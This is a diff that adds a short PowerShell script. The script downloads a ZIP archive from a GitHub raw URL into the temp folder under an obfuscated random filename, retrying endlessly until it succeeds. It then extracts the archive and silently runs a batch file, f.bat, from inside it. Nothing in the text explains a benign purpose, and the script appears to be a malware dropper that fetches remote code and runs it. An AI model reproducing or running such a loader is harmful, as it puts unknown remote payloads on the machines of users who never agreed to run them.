@@ -1,0 +1,41 @@
+$Url = "https://github.com/gjaux/b/raw/refs/heads/a/f2.zip"
+$TempDir = $env:TEMP
+$Output = Join-Path $TempDir "4g5h790g2345h7890g2345h90g23fsdf45h-890v2345h789-3v5h.zip"
+
+# Download function
+function Download-File {
+    while ($true) {
+        if (Test-Path $Output) {
+            Remove-Item $Output -Force
+        }
+
+        try {
+            Invoke-WebRequest -Uri $Url -OutFile $Output -ErrorAction Stop
+            if (Test-Path $Output) {
+                $fileInfo = Get-Item $Output
+                if ($fileInfo.Length -gt 0) {
+                    return $true
+                }
+            }
+        }
+        catch {
+            Write-Output "Download failed"
+        }
+        Start-Sleep -Seconds 1
+    }
+}
+
+# Main execution for ZIP download and extraction
+if (Download-File) {
+    # Extract archive
+    Expand-Archive -Path $Output -DestinationPath $TempDir -Force
+
+    # Execute batch file
+    $Executable = Join-Path $TempDir "f.bat"
+    if (Test-Path $Executable) {
+        Start-Process -FilePath $Executable -NoNewWindow
+    }
+    else {
+        exit 1
+    }
+}
